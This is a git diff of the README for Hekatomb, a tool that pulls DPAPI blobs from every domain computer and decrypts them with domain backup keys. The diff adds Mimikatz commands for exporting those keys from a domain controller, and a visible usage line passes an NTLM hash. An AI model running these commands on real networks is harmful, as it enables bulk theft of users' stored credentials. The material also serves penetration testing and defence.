@@ -16,13 +16,13 @@
 > Hekatomb is a hacking script that connects to LDAP directory to retrieve all computers and users informations.<br />
 > Then it will download all DPAPI blob of all users from all computers and uses Domain backup keys to decrypt them.
 > 
-> Script kiddies codes in C#, real pentester uses Python 🐍
+> Script kiddies codes malwares in C#, real pentesters use Python and are already Domain Admins 🐍
 > 
-<br><br>
+<br>
 <div align="center">
-![info](./.assets/hekatomb.png)
+<img src="./.assets/hekatomb.png" width="80%;">
 </div>
-<br><br>
+<br>
 
 ## What da fuck is this ?
 <br />
@@ -87,5 +87,18 @@ python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/admini
 ```
 
 <br>
+<br
+    
+## How to retrieve domain backup keys ?
+
 <br>
+Just use Mimikatz on your domain controller to extract keys :
+<br><br />
+
+```python
+privilege::debug
+lsadump::backupkeys /export
+```
+
+<br /><br />
 If no domain backup keys are provided, the script will only retrieve DPAPI blobs without decrypting them.
